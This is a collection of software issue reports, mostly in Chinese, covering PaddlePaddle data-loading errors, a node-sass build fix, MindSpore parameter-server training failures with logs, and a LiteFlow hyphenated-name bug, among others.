读取不同size图像数据读取器报错,"标题：读取不同size图像数据读取器报错 1）PaddlePaddle版本：2.0.0 2）CPU： 3）GPU：CUDA 10 CUDNN 7.6.5 4）系统环境：Python3.7 问题描述：使用paddle.io.DataLoader读取不同size图像数据读取器时报错如下，（是我操作的问题还是paddle数据读取器不支持变化的size图片数据呢？）： WARNING:root:DataLoader reader thread raised an exception. Traceback (most recent call last): File """", line 1, in File ""G:\Pycharm\PyCharm 2020.1\plugins\python\helpers\pydev_pydev_bundle\pydev_umd.py"", line 197, in runfile pydev_imports.execfile(filename, global_vars, local_vars) # execute the script File ""G:\Pycharm\PyCharm 2020.1\plugins\python\helpers\pydev_pydev_imps_pydev_execfile.py"", line 18, in execfile exec(compile(contents+""\n"", file, 'exec'), glob, loc) File ""<em>/G_GAN.py"", line 576, in train() File ""</em>/G_GAN.py"", line 524, in train for loader in trainloader: File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\dataloader\dataloader_iter.py"", line 365, in next return self.<em>reader.read_next_var_list() SystemError: (Fatal) Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed</em> != true, but received killed_:1 == true:1.] (at D:\v2.0.0\paddle\paddle/fluid/operators/reader/blocking_queue.h:158) Exception in thread Thread-10: Traceback (most recent call last): File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\threading.py"", line 926, in _bootstrap_inner self.run() File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\dataloader\dataloader_iter.py"", line 347, in _thread_loop six.reraise(*sys.exc_info()) File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\six.py"", line 703, in reraise raise value File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\dataloader\dataloader_iter.py"", line 317, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\dataloader\fetcher.py"", line 65, in fetch data = self.collate_fn(data) File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\dataloader\dataloader_iter.py"", line 93, in default_collate_fn tmp = layers.stack(slot, axis=0) File ""G:\Anaconda3\Anaconda3\envs\paddle_env\lib\site-packages\paddle\fluid\layers\nn.py"", line 10069, in stack return core.ops.stack(x, 'axis', axis) ValueError: (InvalidArgument) Dims of all Inputs(X) must be the same, but received input 1 dim is:339, 510, 3 not equal to input 0 dim:333, 510, 3. [Hint: Expected input_dims[i] == input_dims[0], but received input_dims[i]:339, 510, 3 != input_dims[0]:333, 510, 3.] (at D:\v2.0.0\paddle\paddle\fluid\operators\stack_op.cc:46) [operator &lt; stack &gt; error] 数据集__getitem__: def getitem(self, index):   <code>: LR_data = np.array(cv2.imread(list(TRAIN_DATA_LIST[index].keys())[0], cv2.IMREAD_COLOR)) HR_data = np.array(cv2.imread(list(TRAIN_DATA_LIST[index].values())[0], cv2.IMREAD_COLOR)) LR_data = (LR_data / 127.5) - 1 HR_data = (HR_data / 127.5) - 1 print(LR_data.shape) print(LR_data) # LR_data = self.transforms(LR_data) print(LR_data) # HR_data = self.transforms(HR_data) LR_data = paddle.to_tensor(LR_data, dtype='float32') HR_data = paddle.to_tensor(HR_data, dtype='float32') return LR_data, HR_data"
上传功能配置,上传功能已经优化，在 文件里可以配置上传文件的地址 如果是jetty默认启动端口则配置 如果是tomcat默认启动端口则配置 如果是上传到nginx则配置   <code>: src/main/conf/dev(production)/config/config.properties config.domain = http://localhost config.domain = http://localhost:8080/blade config.domain = http://localhost:8888 config.remoteMode = true config.remotePath = D://nginx/html(/usr/local/nginx/html)
Seperate attributes by purpose,"Currently we maintain all attributes in the same list (function, field, attr，GenericAttrKind). We are running out of the bits so should we consider seperate them by purpose? To be more specific，why do we need GenericAttrKind?   <code>: enum AttrKind : unsigned { #define TYPE_ATTR #define ATTR(STR) ATTR_##STR, #include ""all_attributes.def"" #undef ATTR #undef TYPE_ATTR }; enum FieldAttrKind { #define FIELD_ATTR #define ATTR(STR) FLDATTR_##STR, #include ""all_attributes.def"" #undef ATTR #undef FIELD_ATTR }; enum FuncAttrKind : unsigned { #define FUNC_ATTR #define ATTR(STR) FUNCATTR_##STR, #include ""all_attributes.def"" #undef ATTR #undef FUNC_ATTR }; // only for internal use, not emitted enum GenericAttrKind { #define FUNC_ATTR #define TYPE_ATTR #define FIELD_ATTR #define ATTR(STR) GENATTR_##STR, #include ""all_attributes.def"" #undef ATTR #undef FUNC_ATTR #undef TYPE_ATTR #undef FIELD_ATTR };"
【BUG】客户端管理列表，每次心跳过后，列表没有自动刷新，导致一直显示“未知状态”,1、客户端管理，新建一个客户端，心跳30秒，状态为“未知”； 2、30秒心跳后，sys_client表 status 由2变为0； 3、回到服务端客户管理列表，状态还是未知，必须手动刷新浏览器才会显示最新状态； 报错信息   <code>: ps: 客户端的状态对后续操作至关重要，数据一定要实时
`fluid.layers.flatten`不能添加到`Sequential`,不能像一样添加到中，还是有别的方法添加？ 只能添加到动态图的类吗？   <code>: python3.6 paddle1.7 fluid.layers.flatten tf.Keras Sequential Sequential
乐观锁具体要怎么实现呢?,"Issue里有人提过这个问题,得到的答案如下: 但我还是有几个疑问: 后端程序是如何编写得呢?baseValidator要如何调用呢? 定時任务中要如何实现乐观锁呢? jeesite4还封装了那些锁得操作?   <code>: &lt;%/* 乐观锁，前台提交时间戳作为该表单的版本号，后台更新数据前只要调用baseValidator即可验证版本。 */%&gt; &lt;input type=""hidden"" name=""lastUpdateDateTime"" value=""${module.updateDate.time!}"" /&gt;"
Windows11 环境编译出现问题,"aj-Report 9.8.6版本 在安装了VS2019的电脑上编译node-sass报错。会出现编译失败的提示。 devDependencies node-sass 4.7.2版本会导致无法下载绑定node. Cannot download ""https://github.com/sass/node-sass/releases/download/v4.7.2/win32-x64-64_binding.node"": 使用推荐node版本编译 编译失败提示（..\src\create_string.cpp(17): error C2664: “v8::String::Utf8Value::Utf8Value(const v8::String::Utf8Value &amp;)”: 无法将参数 1 从“v8::Localv8::Value”转换为“const v8::String::Utf8Value &amp;” [xxx.\node-sass\build\binding.vcxproj] ） 目前我们的临时解决方案 安装VS2017 修改package.json 将node-sass 由4.7.2 升至 4.14.1 <ol start=""3""> 通过NVM降级node（需要管理员权限） node将推荐版本 v14.16.0 降级为 10.19.0 如果有更好的解决方案期待回复。   <code>: npm config set msbuild_path='2017安装目录/MSBuild.exe' npm config set msvs_version=2015 ""node-sass"": ""^4.14.1"", nvm install 10.19.0 nvm use 10.19.0"
"[MS] Run resnet50 in ps mode with large lr, it run failed",": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_fema_distributed_ps_0002 将model_zoo中train.py的lr值的大小设置为2**110 sh run_parameter_server_train.sh resnet50 imagenet2012 /home/workspace/config/hccl_8p.json /home/workspace/mindspore_dataset/ImageNet_Original/train/ 使用6月28日whl包，commit_id = ''[sha1]:611a8d89,[branch]:(HEAD,origin/master,origin/HEAD,master)''，报错如下： worker日志： server日志： sched日志： 使用6月30日whl包 commit_id = ''[sha1]:83a6fb44,[branch]:(HEAD,origin/master,origin/HEAD,master)''，报错如下： worker日志： server日志： sched日志： ps模式训练resnet50网络，lr值很大时训练失败   <code>: epoch: 1 step: 1, loss is 6.899092 epoch: 1 step: 2, loss is 4.4564886e+37 [WARNING] PS(147502,fffe5cff91e0,python):2021-07-02-10:34:17.077.356 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147502,fffe5cff91e0,python):2021-07-02-10:34:21.917.064 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:246] EventCallback] The client will retry to connect to the server! [ERROR] PS(147502,fffe5cff91e0,python):2021-07-02-10:34:48.023.517 [mindspore/ccsrc/ps/worker.cc:42] operator()] Trigger timeout event: NODE_TIMEOUT begin to exit the system! [WARNING] PS(147502,fffba94b61e0,python):2021-07-02-10:35:18.023.476 [mindspore/ccsrc/ps/core/abstract_node.cc:430] Heartbeat] The node id:21fff5ad-c1ce-4ce3-a606-dbcfe5ecb1bf Send heartbeat timeout! [WARNING] PS(147502,fffba94b61e0,python):2021-07-02-10:35:18.023.603 [mindspore/ccsrc/ps/core/abstract_node.cc:402] operator()] The node role is:WORKER, the node id is:21fff5ad-c1ce-4ce3-a606-dbcfe5ecb1bf Send heartbeat timeout! [WARNING] PS(147502,fffba94b61e0,python):2021-07-02-10:35:18.023.624 [mindspore/ccsrc/ps/core/abstract_node.cc:405] operator()] The node role is:WORKER, the node id is:21fff5ad-c1ce-4ce3-a606-dbcfe5ecb1bf exited due to scheduler timeout! [ERROR] PS(147502,fffba94b61e0,python):2021-07-02-10:35:18.023.641 [mindspore/ccsrc/ps/worker.cc:37] operator()] Trigger timeout event: SCHEDULER_TIMEOUT begin to exit the system! [WARNING] PS(147502,fffe5cff91e0,python):2021-07-02-10:35:21.023.853 [mindspore/ccsrc/ps/core/abstract_node.cc:657] Disconnect] The node role:WORKER the node id:21fff5ad-c1ce-4ce3-a606-dbcfe5ecb1bf send Finish Message timeout! [INFO] PS(147502,fffe5d7fa1e0,python):2021-07-02-10:35:21.023.928 [mindspore/ccsrc/ps/core/communicator/tcp_server.cc:193] Start] Event base dispatch success! [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.024.058 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:240] RtModelUnbindStream] Unbind stream from model failed! Index: 0 [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.024.209 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:248] RtStreamDestory] Destroy stream for rt_model failed! [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.024.269 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:275] RtModelDestory] Call rt api rtModelDestroy failed, ret: 107002 [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.024.332 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:240] RtModelUnbindStream] Unbind stream from model failed! Index: 0 [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.026.042 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:248] RtStreamDestory] Destroy stream for rt_model failed! [ERROR] GE(147502,fffba94b61e0,python):2021-07-02-10:35:21.026.100 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:275] RtModelDestory] Call rt api rtModelDestroy failed, ret: 107002 epoch: 1 step: 1, loss is None [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:34:17.077.547 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:34:22.162.409 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:34:47.690.323 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:7c2b58e9-c25a-4184-9876-607d5d0a074e is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:34:47.690.396 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:656828c6-f6e2-4b5e-b43e-94556de9bd0f is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.051 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:21fff5ad-c1ce-4ce3-a606-dbcfe5ecb1bf is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.096 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:f3eeaa35-4f60-46c5-a261-0e681f46fc25 is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.108 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:6a35404c-8fd2-4f5e-9cc3-3dcf01fa3c3c is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.120 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:c20dad8b-dc0e-4606-a3a1-ed7d9fa0d506 is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.131 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:8d1eeb21-69bd-47ed-96ad-d1a34eaf32f8 is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.141 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:11ab604b-b013-4c7f-9d90-fa5655840d5d is timeout! [WARNING] PS(147489,fffea4ff91e0,python):2021-07-02-10:35:20.691.152 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:7ff35d53-f301-4a8a-9659-d073594ed02f is timeout! [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:22.242.359 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:22.556.072 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:22.932.840 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:22.947.455 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:23.226.518 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:23.351.305 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:24.194.074 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [ERROR] PS(147489,fffea57fa1e0,python):2021-07-02-10:35:24.194.097 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:266] Start] Event base dispatch failed with no events pending or active! [INFO] PS(147489,fffe87fff1e0,python):2021-07-02-10:35:26.691.376 [mindspore/ccsrc/ps/core/communicator/tcp_server.cc:193] Start] Event base dispatch success! epoch: 1 step: 1, loss is 6.9035006 epoch: 1 step: 2, loss is 4.349433e+37 [ERROR] GE(162188,fffe797fa1e0,python):2021-07-01-19:41:59.739.630 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:231] Run] Call rt api rtStreamSynchronize failed, ret: 507011 [ERROR] DEVICE(162188,fffe797fa1e0,python):2021-07-01-19:41:59.739.898 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:570] DumpTaskExceptionInfo] Task fail infos task_id: 115, stream_id: 9, tid: 163012, device_id: 0, retcode: 507011 [ERROR] DEVICE(162188,fffe797fa1e0,python):2021-07-01-19:41:59.740.793 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:579] DumpTaskExceptionInfo] Dump node (Default/optimizer-Momentum/Mul-op3982) task error input/output data to: ./task_error_dump/0 trace: In file /home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/optim/optimizer.py(721)/ return op_mul(grad, F.cast(scale, F.dtype(grad)))/ [ERROR] DEVICE(162188,fffe797fa1e0,python):2021-07-01-19:41:59.741.307 [mindspore/ccsrc/runtime/device/ascend/ascend_device_address.cc:687] DumpMemToFile] SyncDeviceToHost: rtMemcpy mem size[4004] fail, ret[507899] [ERROR] SESSION(162188,fffe797fa1e0,python):2021-07-01-19:41:59.882.439 [mindspore/ccsrc/backend/session/ascend_session.cc:1138] Execute] run task error! [WARNING] PS(162188,ffff9b79c480,python):2021-07-01-19:42:29.886.189 [mindspore/ccsrc/ps/core/worker_node.cc:116] Finish] [Worker finish]: 2. finish worker node timeout! [INFO] PS(162188,fffbc54b61e0,python):2021-07-01-19:42:29.886.301 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:265] Start] Event base dispatch success! [INFO] PS(162188,fffe78ff91e0,python):2021-07-01-19:42:29.886.404 [mindspore/ccsrc/ps/core/communicator/tcp_server.cc:193] Start] Event base dispatch success! Traceback (most recent call last): File ""train.py"", line 293, in &lt;module&gt; sink_size=dataset.get_dataset_size(), dataset_sink_mode=dataset_sink_mode) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/train/model.py"", line 637, in train sink_size=sink_size) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/train/model.py"", line 431, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/train/model.py"", line 556, in _train_process outputs = self._train_network(*next_element) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 369, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 643, in compile_and_run return _executor(self, *new_inputs, phase=self.phase) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 611, in __call__ return self.run(obj, *args, phase=phase) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 639, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 622, in _exec_pip return self._executor(args_list, phase) RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1138 Execute] run task error! epoch: 1 step: 1, loss is None [WARNING] ME(162172:281472896263296,MainProcess):2021-07-01-19:38:19.970.591 [mindspore/run_check/_check_version.py:296] Please pay attention to the above warning, countdown: 3 [WARNING] ME(162172:281472896263296,MainProcess):2021-07-01-19:38:20.971.741 [mindspore/run_check/_check_version.py:296] Please pay attention to the above warning, countdown: 2 [WARNING] ME(162172:281472896263296,MainProcess):2021-07-01-19:38:21.972.491 [mindspore/run_check/_check_version.py:296] Please pay attention to the above warning, countdown: 1 [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:42:30.398.103 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:42:35.818.516 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:42:35.855.414 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:42:36.201.175 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:42:36.310.792 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:42:59.678.693 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:fef602ab-80c0-44b9-b6eb-5f2f398f0b61 is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:42:59.678.747 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:9c891a32-8bcb-474b-b355-6c78ef3e03bb is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:42:59.678.762 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:031545ee-bd31-46f8-ae9b-24cea0298f38 is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:42:59.678.775 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:e66e4d6b-3989-4201-9f9b-aa562c03099c is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:43:02.678.862 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:6e484a6c-f26c-46ad-a885-b25bbe2026a9 is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:43:32.679.513 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:43fa6b7f-6bd8-43ca-a7cc-71954188535e is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:43:32.679.562 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:30506668-fe4f-4633-b979-bca3ce1c0fa6 is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:43:32.679.576 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:28ec21cd-217d-4839-8800-1648ca5524ea is timeout! [WARNING] PS(162172,fffe8affd1e0,python):2021-07-01-19:43:35.679.719 [mindspore/ccsrc/ps/core/node_manager.cc:156] UpdateCluster] The node id:ec29cc88-0ebc-44ce-8da5-59a87d6703be is timeout! [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:43:36.611.619 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:43:36.638.733 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:43:36.711.413 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [WARNING] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:43:36.734.806 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:251] EventCallback] Client connected end of file [ERROR] PS(162172,fffe8b7fe1e0,python):2021-07-01-19:43:36.734.832 [mindspore/ccsrc/ps/core/communicator/tcp_client.cc:266] Start] Event base dispatch failed with no events pending or active! [INFO] PS(162172,fffe8a7fc1e0,python):2021-07-01-19:43:41.680.011 [mindspore/ccsrc/ps/core/communicator/tcp_server.cc:193] Start] Event base dispatch success!"
node 名称带中划线会报错的问题,"复现步骤 xml cmp test 错误日志   <code>: &lt;chain name=""chain11""&gt; &lt;then value=""a-a""/&gt; &lt;/chain&gt; @Component(""a-a"") @LiteflowCmpDefine public class AACmp { @LiteflowMethod(LiteFlowMethodEnum.PROCESS) public void process(NodeComponent bindCmp) { System.out.println(""AComp executed!""); bindCmp.getSlot().setResponseData(""AComp executed!""); } @LiteflowMethod(LiteFlowMethodEnum.IS_ACCESS) public boolean isAccess(NodeComponent bindCmp) { Integer requestData = bindCmp.getRequestData(); if (Objects.nonNull(requestData) &amp;&amp; requestData &gt; 100){ return true; } System.out.println(""AComp isAccess false.""); return false; } } @Test public void testIsAccess() { LiteflowResponse response = flowExecutor.execute2Resp(""chain11"", 101); Assert.assertTrue(response.isSuccess()); Assert.assertNotNull(response.getSlot().getResponseData()); } java.lang.IllegalStateException: Illegal type name: com.yomahub.liteflow.test.component.cmp1.ByteBuddy$a-a$GDXFCH for class com.yomahub.liteflow.test.component.cmp1.ByteBuddy$a-a$GDXFCH at net.bytebuddy.dynamic.scaffold.InstrumentedType$Default.validated(InstrumentedType.java:1453) ~[byte-buddy-1.11.13.jar:na] at net.bytebuddy.dynamic.scaffold.MethodRegistry$Default.prepare(MethodRegistry.java:519) ~[byte-buddy-1.11.13.jar:na] at net.bytebuddy.dynamic.scaffold.subclass.SubclassDynamicTypeBuilder.make(SubclassDynamicTypeBuilder.java:213) ~[byte-buddy-1.11.13.jar:na] at net.bytebuddy.dynamic.scaffold.subclass.SubclassDynamicTypeBuilder.make(SubclassDynamicTypeBuilder.java:204) ~[byte-buddy-1.11.13.jar:na] at net.bytebuddy.dynamic.DynamicType$Builder$AbstractBase.make(DynamicType.java:3658) ~[byte-buddy-1.11.13.jar:na] at com.yomahub.liteflow.core.proxy.ComponentProxy.getProxy(ComponentProxy.java:78) ~[classes/:na] at com.yomahub.liteflow.util.LiteFlowProxyUtil.proxy2NodeComponent(LiteFlowProxyUtil.java:69) ~[classes/:na] at com.yomahub.liteflow.spring.ComponentScanner.postProcessAfterInitialization(ComponentScanner.java:65) [classes/:na] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsAfterInitialization(AbstractAutowireCapableBeanFactory.java:431) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1703) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:573) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) [spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:759) ~[spring-beans-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:869) ~[spring-context-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) ~[spring-context-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:780) ~[spring-boot-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:412) ~[spring-boot-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:333) ~[spring-boot-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.boot.test.context.SpringBootContextLoader.loadContext(SpringBootContextLoader.java:139) ~[spring-boot-test-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContextInternal(DefaultCacheAwareContextLoaderDelegate.java:99) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContext(DefaultCacheAwareContextLoaderDelegate.java:117) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.support.DefaultTestContext.getApplicationContext(DefaultTestContext.java:108) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:117) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:83) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.boot.test.autoconfigure.SpringBootDependencyInjectionTestExecutionListener.prepareTestInstance(SpringBootDependencyInjectionTestExecutionListener.java:44) ~[spring-boot-test-autoconfigure-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:246) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:227) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner$1.runReflectiveCall(SpringJUnit4ClassRunner.java:289) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) ~[junit-4.12.jar:4.12] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.methodBlock(SpringJUnit4ClassRunner.java:291) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:246) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) ~[junit-4.12.jar:4.12] at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) ~[junit-4.12.jar:4.12] at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) 